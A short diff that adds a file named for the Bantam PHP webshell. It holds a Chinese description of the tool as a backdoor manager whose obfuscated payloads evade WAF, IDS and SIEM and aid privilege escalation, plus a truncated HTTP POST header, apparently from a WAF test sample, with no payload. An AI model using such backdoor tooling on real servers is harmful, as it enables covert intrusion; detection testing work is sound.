@@ -1,0 +1,10 @@
+# webshell_Bantam_php
+# 一个先进的 PHP 后门管理工具，具有轻量级服务器占用、多线程通信和先进的 payload 生成和混淆工具。具备端到端加密功能，使用请求唯一的加密密钥，并且 payload 流式传输旨在绕过 WAF、IDS、SIEM 系统。它结合了多种 payload 随机化和混淆技术，以帮助在加密不可能时防止被检测到。Bantam 是一个理想的工具，用于 Linux PHP 后期利用提权，可以轻松上传枚举脚本。Bantam 还具有插件系统，使得向 UI 添加脚本和功能变得容易。它是用 C# 编程的，在 Windows 上运行，并且可以使用 Wine 在 Linux 上运行。
+POST /?bid=hd_tag_m8mv245q HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv245q
+RM-PRO-Token: 730595c5cfe20f73ee89610b0dcded42
+RM-PRO-Time: 1742808365507
+User-Agent: curl/7.83.1
+Content-Type: multipart/form-data; boundary=9cEAhv4hSCC-87Ae82D12vqdZe5Rh3OX
+
